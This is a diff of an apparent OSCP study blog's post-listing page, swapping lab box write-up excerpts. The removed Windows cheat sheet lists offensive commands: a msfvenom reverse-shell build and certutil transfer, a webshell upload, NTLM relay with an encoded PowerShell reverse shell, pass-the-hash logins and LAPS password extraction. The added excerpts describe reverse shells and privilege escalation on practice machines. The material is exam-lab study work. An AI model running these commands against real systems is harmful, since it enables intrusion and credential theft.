@@ -150,7 +150,7 @@
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---windows/">OSCP - Cheat Sheet - Windows</a>
+          <a href="/posts/oscp---ochima---linux/">OSCP - Ochima - Linux</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -158,8 +158,6 @@
           <span class="post-tags">
             
             #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
             
           </span>
         
@@ -169,65 +167,22 @@
 
         <div class="post-content">
           
-            <h1 id="quick-reference">Quick Reference</h1>
-<ul>
-<li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
-<li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
-<li><code>dir /s/b *.txt</code></li>
-<li>RDP: <code>xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore</code></li>
-<li>RevShell.exe: <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe</code></li>
-<li>Compile C: <code>/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe</code></li>
-<li>Compile C#: <code>msbuild projectname.csproj</code></li>
-<li>Transfer to Windows host: <code>certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe</code></li>
-<li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
-<li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
-</ul>
-<h1 id="port-enumeration-from-kali">Port Enumeration (from Kali)</h1>
-<ul>
-<li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
-<ul>
-<li>Run <code>put /usr/share/webshells/aspx/cmdasp.aspx</code> to upload command shell, then access via browser</li>
-</ul>
-</li>
-<li><strong>Kerberos (88)</strong>: <code>kerbrute userenum -d domain.name --dc 192.168. users</code></li>
-<li><strong>SMB (139/445)</strong>: <code>sudo nmap --script smb-vuln* -p 139,445 192.168.</code>
-<ul>
-<li><code>smbclient -U user \\\\192.168.</code></li>
-<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code> (base64 powershell one-liner)
-<ul>
-<li>Kali: Call fake directory <code>dir \\192.168.xx.xxx\fake</code> for reverse shell</li>
-</ul>
-</li>
-<li>Pass the Hash: <code>smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></li>
-</ul>
-</li>
-<li><strong>LDAP (389)</strong>: <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.</code>
-<ul>
-<li>Domain Name found (LDAP Search): <code>ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'</code></li>
-<li>Use credentials to find admin password <code>ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code>
-<ul>
-<li>To Login <code>psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x</code> to login</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="impacket">Impacket</h1>
-<p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
-<code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
+            <h1 id="ochima">Ochima</h1>
+<p>This one was an exercise in frustration purely because the exploit didn&rsquo;t seem to work on the port I wanted it to (<code>4444</code>) but <em>would</em> work on port <code>80</code>!?</p>
+<p>I tired all sorts of things to get it work, the walkthroughs didn&rsquo;t explain why they used port 80, and the exploit itself indicated it&rsquo;d work on whatever I picked&hellip; but the moment I popped port 80 into the exploit&rsquo;s reverse shell parameters I got an incoming connection. So an important reminder that if a reverse shell isn&rsquo;t working on port <code>4444</code> then try the same thing but with a listener on port <code>80</code> instead</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---windows/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---ochima---linux/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---clue---linux/">OSCP - Clue - Linux</a>
+          <a href="/posts/oscp---pc---linux/">OSCP - PC - Linux</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -244,122 +199,27 @@
 
         <div class="post-content">
           
-            <h1 id="clue">Clue</h1>
-<p>This was definitely a hard box, but the biggest challenges came from the range of different services AND the box itself not working properly. After a couple of hours bashing my head against the brick wall trying to get initial access, I finally relented and looked at a walkthrough&hellip; only to find that the <code>cassandra</code> exploit I&rsquo;d tried to use to display files on the target hadn&rsquo;t worked because the box needed to be reverted.</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---clue---linux/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/oscp---cockpit---linux/">OSCP - Cockpit - Linux</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <h1 id="cockpit">Cockpit</h1>
-<p>This one was originally listed as &ldquo;Hard&rdquo; in my list, but when I checked during startup it showed as &ldquo;Intermediate&rdquo;. Definitely don&rsquo;t think it should be listed as &ldquo;Intermediate&rdquo; though - this was definitely the trickest boxes I&rsquo;ve done, and I absolutely leaned heavily on the walkthrough to make progress here.</p>
-<p>The biggest challenge ofcourse was the box breaking everytime I tried to run <code>gobuster</code> against it to find directories or files. Turned out there was a hidden <code>login.php</code> file on the port <code>80</code> server, but I couldn&rsquo;t find the damn thing with the first few gobuster scans because the whole box would break and require revert. Worse was finding the <code>blocked.html</code> page which would break the box every time I visited it OR scanned it with <code>gobuster</code>.</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---cockpit---linux/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/oscp---codo---linux/">OSCP - Codo - Linux</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <h1 id="codo">Codo</h1>
-<p>Interesting experience just slowly working through this over the day. Having the walkthrough as a reference is handy, although I should have done more enumeration to identify everything <code>linpeas</code> was providing. Helpful experience updating the cheatsheet for fully interactive TTS too - most references just use <code>python</code> when pretty much everyone/thing is using <code>python3</code>, so be sure to watch out for that when copy/pasting from references.</p>
-<p>Keep revshells.com handy too, and keep practicing with msfvenom too, as a lot of your holdup today was trying to find the right reverse shell for php, when you should have just been able to pull it up in a heartbeat</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---codo---linux/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/oscp---crane---linux/">OSCP - Crane - Linux</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <h1 id="crane">Crane</h1>
-<p>This was the most straight-forward box so far. While a walkthrough was referenced for some of the exploit syntax, the exploit itself had already been found and tested before hand, so catching the reverse shell was straightforward.</p>
-<p>After initial access, it was clear <code>usr/sbin/service</code> could be used for privilege escalation. It took a bit of testing, but combining <code>www-data</code>&rsquo;s sudo privileges with directory traversal led to <code>root</code> access</p>
+            <h1 id="pc">PC</h1>
+<p>This was an interesting one, with <code>linpeas</code> showing multiple vulnerabilities and yet the most obvious two didn&rsquo;t work because of missing dependencies and no user credentials.</p>
+<p>Figuring out how <code>rpcpy-exploit</code> worked was interesting, but the real lesson here was understanding how if the SUID binary can be set then you can run Bash in privileged mode with <code>/bin/bash -p</code> and become <code>root</code></p>
 <h1 id="resolution-summary">Resolution summary</h1>
 <ul>
-<li>Scanned with Nmap to find ports 22, 80, &amp; 3306</li>
-<li>Navigated to <code>http://192.168.137.146:80</code></li>
-<li>Password guessed admin login, and identified SuiteCRM 7.12.3</li>
-<li>Found exploit for CVE-2022-23940, executed against target &amp; achieved shell</li>
-<li>Checked sudo privileges and found <code>/usr/sbin/services</code></li>
-<li>Used <code>sbin</code> &amp; directory traversal to escalate to <code>root</code></li>
+<li>Ran Nmap to identify ports <code>22</code> &amp; <code>8000</code></li>
+<li>Visited http (<code>8000</code>) &amp; identified <code>ttyd</code></li>
+<li>Created reverse shell and enumerated target</li>
+<li>Ran <code>linpeas.sh</code> and identified multiple vulnerabilities and <code>rpc.sh</code> script</li>
+<li>Identified exploit for <code>rpc.sh</code> and used it to modify <code>/bin/bash</code> set permission</li>
+<li>Used <code>/bin/bash -p</code> to switch to <code>root</code></li>
 </ul>
 <h2 id="improved-skills">Improved skills</h2>
 <ul>
-<li>Finding/testing exploits</li>
-<li>Linux Privilege Escalation</li>
+<li>Identifying vulnerabilities &amp; scripts with <code>linpeas.sh</code></li>
 </ul>
 <h2 id="used-tools">Used tools</h2>
 <ul>
-<li>Nmap</li>
-<li>NetCat</li>
+<li>nmap</li>
+<li>ttyd</li>
+<li>python</li>
 </ul>
 <hr>
 <h1 id="information-gathering">Information Gathering</h1>
@@ -369,7 +229,146 @@
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---crane---linux/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---pc---linux/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/oscp---pelican---linux/">OSCP - Pelican - Linux</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="pelican">Pelican</h1>
+<p>Pretty happy with this one considering I figured most of it out without really looking at a walkthrough. Identifying Exhibition vs Zookeeper was a little confusing, but as soon as I identified that Exhibition v1.0 was vulenerable to command injection then finding &amp; using an exploit (which was really just adding a reverse shell to a java script field) became fairly straightforward.</p>
+<p>Privilege escalation with <code>gcore</code> was a little tricky, as it&rsquo;s been awhile since I needed to remember how <code>strings</code> worked. But once it became clear I could search for plaintext passwords then it made sense and switching to root was easy.</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---pelican---linux/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/oscp---plum---linux/">OSCP - Plum - Linux</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="plum">Plum</h1>
+<p>This one was relatively easy to achieve initial access on, but enumerating the target once I had initial access was frustrating. I&rsquo;d learned on the previous box that I could pull up locally stored mail by visiting <code>/var/mail</code> but hadn&rsquo;t quite realised that it should be part of my standard privesc process.</p>
+<p>Anyway, once I got the nudge from the walkthrough to check mail, it became straight-forward to switch to root and grab the flag, but 100% an important lesson in seeing the <code>var/mail/www-data</code> in the <code>Linpeas</code> output and being sure to read the mail incase there&rsquo;s anything important or useful (like credentials) saved there.</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---plum---linux/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/oscp---provinggrounds---linux/">OSCP - ProvingGrounds - Linux</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <p>Tags: <a href="/posts/oscp/">OSCP</a></p>
+<h1 id="tj-null---pg-play---11">TJ Null - PG Play - 11</h1>
+<ul>
+<li><input disabled="" type="checkbox"> eLection1</li>
+<li><input disabled="" type="checkbox"> Stapler</li>
+<li><input disabled="" type="checkbox"> Monitoring</li>
+<li><input disabled="" type="checkbox"> InsanityHosting</li>
+<li><input disabled="" type="checkbox"> DriftingBlue6</li>
+<li><input disabled="" type="checkbox"> Loly</li>
+<li><input disabled="" type="checkbox"> Blogger</li>
+<li><input disabled="" type="checkbox"> Amaterasu</li>
+<li><input disabled="" type="checkbox"> Blogger</li>
+<li><input disabled="" type="checkbox"> Potato</li>
+<li><input disabled="" type="checkbox"> DC-9</li>
+</ul>
+<h1 id="tj-null---pg-practice---0">TJ Null - PG Practice - 0</h1>
+<p>Easy - 0/7</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Twiggy</li>
+<li><input checked="" disabled="" type="checkbox"> Exfiltrated</li>
+<li><input checked="" disabled="" type="checkbox"> Astronaut</li>
+<li><input checked="" disabled="" type="checkbox"> Codo</li>
+<li><input checked="" disabled="" type="checkbox"> Levram</li>
+<li><input checked="" disabled="" type="checkbox"> Hub</li>
+<li><input checked="" disabled="" type="checkbox"> RubyDome</li>
+</ul>
+<p>Intermediate - 0/15</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> Pelican</li>
+<li><input checked="" disabled="" type="checkbox"> Boolean</li>
+<li><input checked="" disabled="" type="checkbox"> Crane</li>
+<li><input checked="" disabled="" type="checkbox"> Extplorer</li>
+<li><input checked="" disabled="" type="checkbox"> Image</li>
+<li><input checked="" disabled="" type="checkbox"> Iaw</li>
+<li><input checked="" disabled="" type="checkbox"> Lavita</li>
+<li><input checked="" disabled="" type="checkbox"> PC</li>
+<li><input checked="" disabled="" type="checkbox"> Fired</li>
+<li><input checked="" disabled="" type="checkbox"> Press</li>
+<li><input checked="" disabled="" type="checkbox"> Scrutiny</li>
+<li><input checked="" disabled="" type="checkbox"> Flu</li>
+<li><input checked="" disabled="" type="checkbox"> Ochima</li>
+<li><input checked="" disabled="" type="checkbox"> PyLoader</li>
+<li><input checked="" disabled="" type="checkbox"> Plum</li>
+<li><input checked="" disabled="" type="checkbox"> Cockpit</li>
+</ul>
+<p>Hard - 0/3</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---provinggrounds---linux/">[Read more]</a>
           </div>
         
       </article>
